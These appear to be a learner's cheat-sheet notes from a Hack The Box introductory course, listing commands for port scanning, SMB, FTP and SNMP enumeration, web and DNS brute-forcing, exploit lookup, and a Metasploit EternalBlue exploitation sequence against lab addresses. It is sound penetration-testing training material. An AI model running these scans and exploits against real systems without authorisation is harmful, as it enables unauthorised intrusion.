# GettingStarted(HTB)
Lessons and Tutorials Covered

## NCAT
# netcat can be used to connect to any listening port and interact with the service running on that port.
> ncat ip port 
> nc -nv ip port

## NMAP
# port scanner
> nmap -sV -sC -p- 10.129.42.253
> whatweb --no-errors 10.10.10.0/24
> nmap -sV --script=banner -p21 10.10.10.0/24
> nmap -sC -sV -p21 10.129.42.253
> nmap --script smb-os-discovery.nse -p445 10.10.10.40
> nmap -A -p445 10.129.42.253

> locate scripts/citrix
> nmap --script <script name> -p<port> <host>
  
  ## Connecting 
  # ftp =   ftp -p 10.129.42.253
  # smb =   smbclient -N -L \\\\10.129.42.253
    smbclient \\\\10.129.42.253\\users
    smbclient -U bob \\\\10.129.42.253\\users
  # snmp =   snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
    snmpwalk -v 2c -c private  10.129.42.253 
    onesixtyone -c dict.txt 10.129.42.254
  
  
  ## WEB Enumb
  # banner grabbing
  > curl -IL https://www.inlanefreight.com
  > whatweb 10.10.10.121
  > whatweb --no-errors 10.10.10.0/24
  # scan web directories
  > gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
  # install seclists = git clone https://github.com/danielmiessler/SecLists && sudo apt install seclists -y
  # Next, add a DNS Server such as 1.1.1.1 to the /etc/resolv.conf file.
  > gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
  
  ## Exploit Scan
  # sudo apt install exploitdb -y
  > searchsploit openssh 7.2
  ## Metasploit
  # Metasploit Framework (MSF) contains exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets
  > msfconsole
    > search exploit eternalblue
    > use exploit/windows/smb/ms17_010_psexec
    > set RHOSTS 10.10.10.40
    > check
    > exploit
  
  ## Reverse Shell
  #
  > 
  > 
  > 
  > 

* File Inclusion / Directory Traversal (HTB Academy)
* Linux Fundermentals (HTB Academy)
* Login Attacks (HTB Academy)
* Metasploit (HTB Academy)
* Nmap (HTB Academy)
* Web Enumeration
* Windows Fundermentals (HTB Academy)

##### Connect to VPN
> sudo openvpn user.ovpn
